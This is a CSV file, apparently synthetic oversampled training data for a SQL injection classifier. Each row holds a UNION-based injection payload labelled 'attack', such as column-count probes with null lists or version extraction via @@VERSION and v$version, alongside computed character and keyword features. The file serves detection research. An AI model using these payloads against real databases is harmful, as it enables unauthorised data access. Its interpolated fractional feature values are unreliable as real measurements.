id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,union," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000059,0.21533851893934725,86.11053672683217,26.77375708782513,3.8106579614373866,42.0,4.0,29.0,11.110536726832162,0.4877515981653367,0.04645253315860351,0.33678086539987534,0.12901500327618445,0.0,0.0,2.0,-2.168404344971009e-19,1.0,2.0,0.0,2.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000012,attack,union,"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",nearest_attack_euclidean,R000668,0.06865024790677551,90.58354351605806,26.91670870321161,4.031234052114675,25.0,39.666834812846446,16.0,9.916708703211611,0.27605563660855464,0.43781500476957635,0.17667560742947497,0.10945375119239409,0.0,0.0,1.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,5.9167087032116115,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000013,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R001222,0.11688258559693471,45.186404981966284,22.0,4.188660138181382,14.0,19.349123985573026,4.0,7.837280996393257,0.31038723767363313,0.42753531479164025,0.08868206790675232,0.1733953796279743,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,1.0,0.0,2.8372809963932566,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000014,attack,union,"1%""   )    )     )   union all select null,null,null#",nearest_attack_euclidean,R000445,0.10700262130669594,53.759321049656805,17.0,3.2376218382857296,26.607456839725447,1.0,18.0,8.151864209931361,0.49429555711721224,0.018640514809926068,0.33552926657866944,0.15153466149419217,0.0,1.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,3.0,1.0,0.0,2.151864209931362,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000015,attack,union,1  )   as ratg where 3033  =  3033 union all select null--,nearest_attack_euclidean,R000657,0.15153808862975857,57.621530320126794,21.25231311991547,3.7929993365186045,28.74768688008453,9.0,15.747686880084531,4.126156559957734,0.4988531221822024,0.15624019658898397,0.27317283822033667,0.07173384300847693,0.0,0.0,2.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,0.12615655995773478,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000016,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R000341,0.03216262571019538,80.77949127350493,24.970598836467325,3.859092549436169,40.82359301880394,9.0,22.0,8.955898254700985,0.5051911508248068,0.11148233792339238,0.2725123815905147,0.11081412966128609,0.0,1.0,2.0,-2.168404344971009e-19,0.0,1.0,0.0,2.0,0.0,0.0,2.9558982547009856,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000017,attack,union,"1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001267,0.3393628754742254,97.96741858552186,23.655806195173952,3.6748557654871368,60.311612390347904,9.0,15.311612390347904,13.344193804826048,0.6156183809898579,0.09188691421825582,0.1561838098985788,0.13631089489330753,1.0,0.0,2.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,8.344193804826048,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000018,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000030,0.11531825534723762,73.0,32.54215471764908,4.387580472240458,42.0,2.9999999999999982,17.0,11.0,0.5753424657534246,0.0410958904109589,0.2328767123287671,0.1506849315068493,0.0,0.0,2.0,-2.168404344971009e-19,1.0,1.0,0.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000019,attack,union,"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",nearest_attack_euclidean,R001157,0.2869545108344128,63.0,20.0,3.6222204112007574,14.0,36.0,4.0,9.0,0.2222222222222222,0.5714285714285714,0.06349206349206349,0.14285714285714285,0.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,7.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000020,attack,union,"-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#",nearest_attack_euclidean,R000897,0.1971448705188957,79.45512703387983,22.0,3.7354575219539328,14.0,34.76410162710387,18.0,12.691025406775967,0.17635286249604976,0.4372169685795548,0.22673939463777823,0.15969077428661718,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,3.0,0.0,0.0,6.691025406775967,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000021,attack,union," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000059,1.6634195097932165,96.51837128950186,26.33930229966135,3.7981029355968485,49.4646505925497,4.6786045993227,31.7144183972908,10.66069770033865,0.5082675767044521,0.04813024352849776,0.3300941378226451,0.11350804194440504,0.0,0.0,2.0,-2.168404344971009e-19,1.0,2.33930229966135,0.0,2.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.3393022996613502,1.3393022996613504,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.6786045993227
SMOTE_000022,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R001201,0.26171798002946955,67.95622671691909,19.0,3.5506265793941045,48.564981373535275,1.0,11.0,7.391245343383819,0.7145424914550003,0.014734053197413749,0.1620745851715514,0.10864887017603465,1.0,0.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,0.0,0.0,4.391245343383819,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000023,attack,union,"1""   )    )     )   union all select null#",nearest_attack_euclidean,R001150,0.6218737844287234,40.02182410443723,15.0,3.0693431711724095,18.0,1.0,16.417459283549782,4.6043648208874455,0.45148466288296646,0.025082481271275936,0.4087132921680957,0.11471956367766188,0.0,1.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.6043648208874455,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000024,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R001536,0.28762341700517424,59.64855090332777,25.21618363444259,3.9503799349276867,20.297101806655537,19.135265462229643,14.432367268885178,5.78381636555741,0.33958626009553006,0.32148978791825955,0.24177964904801444,0.0971443029381959,1.0,0.0,1.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,0.7838163655574104,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000025,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001320,0.08658350670045369,77.31331778742528,17.0,3.1519425429058057,49.45065422994022,1.0,14.0,12.862663557485055,0.6394202753703004,0.012949977792717726,0.18129968909804792,0.16633005773893395,1.0,0.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,1.0,0.0,7.862663557485055,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000026,attack,union," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000088,1.61199206470051,103.61166189638271,26.04466475855309,3.952097376316484,63.910670482893835,3.522332379276545,28.13399427565927,8.04466475855309,0.6176544025416604,0.03389880297195805,0.27099214220362583,0.07745465228275575,0.0,0.0,2.0,-2.168404344971009e-19,1.0,2.0,0.0,1.0446647585530897,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5223323792765449,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000027,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R001196,0.5680897413353099,59.0,17.0,3.3111563640484056,32.55246065320489,1.0,15.447539346795107,10.0,0.5517366212407608,0.01694915254237289,0.2618227007931374,0.1694915254237288,0.0,1.0,2.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.361884836698777,1.0,0.0,3.638115163301223,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000028,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R001072,0.602237078176488,64.73482749828908,24.526517250171093,4.051252783213965,19.0,27.787861998631264,10.0,7.946965499657816,0.2952472089363113,0.4270561571330804,0.15539326786121646,0.12230336606939175,1.0,0.0,3.0,-2.168404344971009e-19,0.0,1.0,0.0,0.0,0.0,0.0,2.946965499657815,4.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000029,attack,union,"-1166'   )    )    as icdz where 1042  =  1042 union all select 1042,1042,1042,1042,1042#",nearest_attack_euclidean,R000907,0.35159421289427206,88.86625387958425,28.486625387958426,4.005432007199089,25.0,31.893003103667404,22.0,9.973250775916851,0.28221170884123525,0.3574920405369431,0.24834630378028705,0.11194994684153459,1.0,0.0,1.0,-2.168404344971009e-19,0.0,1.0,0.0,2.0,0.0,0.0,3.9732507759168505,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000030,attack,union,"1"" where 8672  =  8672 union all select null,null#",nearest_attack_euclidean,R001404,0.20571944962713895,51.215012311837555,22.75699753763249,3.9903025560869545,27.972009849470048,9.0,10.0,4.243002462367512,0.5457436945650502,0.17602359607034979,0.1955817734114998,0.08265093595310012,0.0,1.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,0.0,0.0,0.0,1.2430024623675116,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000031,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000403,0.26322741649315523,64.17291820758919,16.0,3.1263434142734106,47.73833456607136,1.0,4.0,11.43458364151784,0.7430366800721884,0.015823144424392116,0.06329257769756849,0.17784759780585102,1.0,0.0,2.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,1.0,0.0,7.43458364151784,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000032,attack,union,"-1475""  )   union all select 8611,8611,8611#",nearest_attack_euclidean,R000617,0.36481520020188585,45.6288470573534,21.348461177058642,3.9371809590565507,14.0,17.303077645882716,8.0,6.325769411470679,0.307604889237965,0.3781418661879338,0.17577422242169427,0.13847902215240698,0.0,1.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,0.0,0.0,2.325769411470679,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
